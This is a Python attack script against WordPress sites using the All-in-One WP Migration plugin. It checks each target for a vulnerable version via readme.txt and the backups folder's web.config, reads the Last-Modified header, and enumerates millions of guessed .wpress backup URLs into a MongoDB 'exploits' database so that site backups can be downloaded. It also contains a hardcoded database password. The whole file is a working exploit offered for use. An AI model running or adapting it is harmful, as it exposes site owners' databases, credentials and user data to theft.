import pymongo
import requests
import datetime
import json
from urllib.parse import urlparse

_headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Connection":"close","Accept":"*/*"
}

db_ip = 'localhost'
db_port = '27017'
client = pymongo.MongoClient(f"mongodb://cal:jamieisanonce@{db_ip}:{db_port}/")

db = client['exploits']
wp_attack = db['WPai1wm']
wp_attack.drop()

def check_version(url):
    vercheck = requests.get(f"{url}/wp-content/plugins/all-in-one-wp-migration/readme.txt",
                            headers=_headers,
                            verify=False).text
    if "7.15" in vercheck:
        return False
    else:
        return True

def check_config(url):
    
    print (f'checking {url}')
    try:
        response = requests.get(f"{url}/wp-content/ai1wm-backups/web.config",
                                headers=_headers,
                                verify=False)
    except Exception as err:
        print (err)
        print (url,':: failed to get web.config')
        return False

    
    if not ".wpress" in response.text:
        print (url,':: cant find .wpress in response')
        return False
    
    headers = response.headers
    if not 'Last-Modified' in headers:
        print (url,':: cant last-modified in headers')
        return False
    
    if not check_version(url):
        print (url,':: failed version check')
        return False
    
    last_modified = headers['last-modified']
    return last_modified

def register_urls(urls):
    print (f'preparing documents')
    documents = [
        {'url':url,'ntries':0}
        for url in urls
    ]
    print (f"inserting {len(documents)}")
    wp_attack.insert_many(documents,bypass_document_validation=True)
    print ('done')
    print (wp_attack.count())


    
def process_url(base_url):
    if last_modified := check_config(base_url): 
        timestamp = datetime.datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
        time_ymd = timestamp.strftime("%Y%m%d")
        time_hms = timestamp.strftime("%H")
        
        r = requests.get(""+base_url+"", headers=_headers,verify=False)
        domain = urlparse(r.url).netloc
        
        urls = [
            f"{r.url}/wp-content/ai1wm-backups/{domain}-{time_ymd}-{time_hms}{i:02d}{j:02d}-{k:03d}.wpress"
            #{"i":f"{i:02d}","j":f"{j:02d}","k":f"{k:03d}"}
            for i in range(0,60)
            for j in range(0,60)
            for k in range(100,1000)
        ]

        register_urls(urls)

        
def read_file(fname):
    with open(fname) as f:
        lines = f.readlines()
        for i,line in enumerate(lines):
            base_url = line.rstrip()
            process_url(base_url)
        print ('setting indexes')
        print ('................')
        wp_attack.create_index( [('url',pymongo.ASCENDING )] )

        
read_file('backups.txt')
